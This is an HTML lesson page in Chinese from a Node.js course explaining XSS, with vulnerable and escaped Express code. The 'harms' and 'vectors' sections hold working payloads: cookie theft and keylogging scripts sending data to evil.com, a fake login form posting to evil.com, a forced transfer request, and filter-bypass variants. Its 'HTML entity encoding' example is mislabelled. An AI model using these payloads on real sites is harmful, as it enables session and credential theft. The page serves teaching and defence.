@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>91.1 XSS 攻击原理 - Node.js + TypeScript 全栈开发课程</title>
+  <link rel="stylesheet" href="../styles.css">
+</head>
+<body>
+  <nav class="navbar">
+    <div class="navbar-brand">Node.js + TypeScript 全栈开发</div>
+    <ul class="navbar-nav">
+      <li><a href="../index.html">首页</a></li>
+      <li><a href="91-1-XSS攻击原理.html">第九十一章</a></li>
+    </ul>
+  </nav>
+
+  <div class="container">
+    <header class="page-header">
+      <h1>91.1 XSS 攻击原理</h1>
+      <p class="subtitle">跨站脚本攻击深入解析</p>
+    </header>
+
+    <div class="content-block animate-fade-in-up">
+      <h2><span class="icon">🎯</span> 学习目标</h2>
+      <ul class="feature-list">
+        <li>深入理解 XSS 攻击原理</li>
+        <li>掌握 XSS 攻击流程</li>
+        <li>了解 XSS 的危害</li>
+        <li>学会识别 XSS 漏洞</li>
+      </ul>
+    </div>
+
+    <div class="content-block">
+      <h2><span class="icon">📚</span> XSS 攻击概述</h2>
+      <p>XSS (Cross-Site Scripting) 是一种代码注入攻击，攻击者将恶意脚本注入到网页中，在其他用户浏览时执行。</p>
+      <div class="code-block">
+# XSS 攻击定义
+攻击者利用网页漏洞，将恶意脚本注入到页面中
+当其他用户访问该页面时，脚本在其浏览器中执行
+
+# 为什么叫 XSS
+原本应该叫 CSS (Cross-Site Scripting)
+但与 Cascading Style Sheets 冲突
+所以改为 XSS
+
+# XSS 攻击流程
+1. 攻击者发现输入输出漏洞
+2. 构造恶意脚本注入
+3. 脚本被存储或反射到页面
+4. 受害者访问包含脚本的页面
+5. 脚本在受害者浏览器执行
+6. 攻击者窃取数据或执行操作
+
+# XSS 攻击条件
+1. 网页存在输入输出漏洞
+2. 用户输入未经处理直接输出
+3. 攻击者能够构造恶意输入
+4. 用户访问包含恶意脚本的页面
+      </div>
+    </div>
+
+    <div class="content-block">
+      <h2><span class="icon">🔧</span> 攻击示例分析</h2>
+      <div class="code-block">
+# 场景：搜索功能反射用户输入
+
+## 正常请求
+GET /search?q=hello
+Response: &lt;div&gt;搜索结果: hello&lt;/div&gt;
+
+## XSS 攻击请求
+GET /search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;
+Response: &lt;div&gt;搜索结果: &lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/div&gt;
+
+# 服务端代码漏洞
+// 不安全的代码
+app.get('/search', (req, res) => {
+  const query = req.query.q;
+  res.send(`&lt;div&gt;搜索结果: ${query}&lt;/div&gt;`);
+});
+
+// 安全的代码
+import escapeHtml from 'escape-html';
+
+app.get('/search', (req, res) => {
+  const query = req.query.q;
+  res.send(`&lt;div&gt;搜索结果: ${escapeHtml(query)}&lt;/div&gt;`);
+});
+
+# 常见注入点
+1. URL 参数
+2. 表单输入
+3. URL 路径
+4. HTTP 头
+5. Cookie
+6. 文件上传
+      </div>
+
+      <div class="tip-box warning">
+        <span class="icon">⚠️</span>
+        <div class="content">
+          <div class="title">危害示例</div>
+          <p>以上仅是演示 alert 弹窗。实际攻击可能窃取 Cookie、发送请求、修改页面内容、传播蠕虫等。</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="content-block">
+      <h2><span class="icon">⚙️</span> XSS 攻击危害</h2>
+      <div class="code-block">
+# 1. 窃取 Cookie 和 Session
+&lt;script&gt;
+  fetch('https://evil.com/steal?cookie=' + document.cookie);
+&lt;/script&gt;
+
+# 2. 劫持用户操作
+&lt;script&gt;
+  // 发起转账请求
+  fetch('/api/transfer', {
+    method: 'POST',
+    body: JSON.stringify({ to: 'hacker', amount: 10000 }),
+    credentials: 'include',
+  });
+&lt;/script&gt;
+
+# 3. 篡改页面内容
+&lt;script&gt;
+  document.body.innerHTML = '&lt;h1&gt;网站已被攻击&lt;/h1&gt;';
+&lt;/script&gt;
+
+# 4. 键盘记录
+&lt;script&gt;
+  document.addEventListener('keydown', (e) => {
+    fetch('https://evil.com/log?key=' + e.key);
+  });
+&lt;/script&gt;
+
+# 5. 钓鱼攻击
+&lt;script&gt;
+  document.body.innerHTML = `
+    &lt;form action="https://evil.com/phish"&gt;
+      &lt;input name="username" placeholder="用户名"&gt;
+      &lt;input name="password" type="password" placeholder="密码"&gt;
+      &lt;button&gt;登录&lt;/button&gt;
+    &lt;/form&gt;
+  `;
+&lt;/script&gt;
+
+# 6. 蠕虫传播
+&lt;script&gt;
+  // 在社交网站发送包含恶意脚本的消息
+  // 形成蠕虫式传播
+&lt;/script&gt;
+      </div>
+    </div>
+
+    <div class="content-block">
+      <h2><span class="icon">🚀</span> 攻击向量多样性</h2>
+      <div class="code-block">
+# 多种 XSS 注入方式
+
+## 标签注入
+&lt;script&gt;alert(1)&lt;/script&gt;
+
+## 事件处理器
+&lt;img src=x onerror="alert(1)"&gt;
+&lt;svg onload="alert(1)"&gt;
+&lt;body onload="alert(1)"&gt;
+
+## JavaScript 伪协议
+&lt;a href="javascript:alert(1)"&gt;click&lt;/a&gt;
+
+## 数据绑定
+&lt;div data-value="&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;/div&gt;
+
+## HTML 属性
+&lt;input value="" onfocus="alert(1)" autofocus&gt;
+
+## SVG
+&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;
+
+## Math
+&lt;math&gt;&lt;mtext&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/mtext&gt;&lt;/math&gt;
+
+## 模板注入
+{{constructor.constructor('alert(1)')()}}
+
+# 编码绕过
+# HTML 实体编码
+&lt;script&gt;alert(1)&lt;/script&gt;
+
+# URL 编码
+%3Cscript%3Ealert(1)%3C/script%3E
+
+# Unicode 编码
+\u003cscript\u003ealert(1)\u003c/script\u003e
+      </div>
+    </div>
+
+    <div class="content-block">
+      <h2><span class="icon">📝</span> 本节小结</h2>
+      <div class="tip-box success">
+        <span class="icon">✅</span>
+        <div class="content">
+          <ul style="list-style: none; padding: 0;">
+            <li>• XSS 是将恶意脚本注入网页的攻击</li>
+            <li>• 危害包括窃取 Cookie、劫持操作、篡改页面</li>
+            <li>• 攻击向量多种多样，不限于 script 标签</li>
+            <li>• 防护需要多层次的编码和过滤</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <div class="chapter-nav">
+      <a href="../chapter90/90-5-安全头配置.html">← 上一章：安全头配置</a>
+      <a href="91-2-XSS类型.html">下一节：XSS 类型 →</a>
+    </div>
+  </div>
+</body>
+</html>
